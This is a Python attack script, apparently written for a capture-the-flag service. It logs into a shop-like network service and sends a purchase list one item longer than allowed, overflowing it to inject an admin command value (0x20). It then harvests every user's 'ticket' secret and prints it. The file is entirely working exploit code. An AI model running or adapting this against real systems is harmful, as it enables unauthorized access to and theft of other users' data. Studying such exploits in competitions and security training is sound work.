import asyncio
from asyncio import open_connection, get_event_loop

class AttackError(Exception):
    pass

async def timed(aw, timeout=5.0):
        return await asyncio.wait_for(aw, timeout=timeout)

async def attack(host: str, port: int) -> None:
        reader, writer = await open_connection(host, port)
        await timed(reader.readuntil(b": "))
        writer.write(b"lol\n")
        await timed(reader.readuntil(b": "))
        writer.write(b"lol\n")
        await timed(reader.readuntil(b"> "))

        writer.write(b"list\n")
        resp = await timed(reader.readuntil(b"> "))
        quoted = resp.rstrip(b"> ").rstrip().split(b" ")
        names = list(x[1:-1] for x in quoted)

        writer.write(b"buy\n")
        await timed(reader.readuntil(b": "))

        # one longer than allowed
        # 32 == 0x20 == AdminAwaitCommand
        writer.write(b"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 32\n")
        await timed(reader.readuntil(b"> "))

        flags = []
        try:
                for user in names:
                        writer.write(b"name\n")
                        await timed(reader.readuntil(b": "))
                        writer.write(user)
                        data = await timed(reader.readuntil(b"> "))
                        data = data.decode()
                        begin = data.find("ticket") + len("ticket") + 2
                        end = data.rfind('"')
                        data = data[begin:end]
                        print(data)
                        flags.append(data)
        except:
                # let's treat timeout exceptions as checker errors here I guess
                raise AttackError()
        if len(data) == 0:
                raise AttackError("No flags got")

if __name__ == "__main__":
        import sys
        loop = get_event_loop()
        loop.run_until_complete(attack(sys.argv[1], 5001))
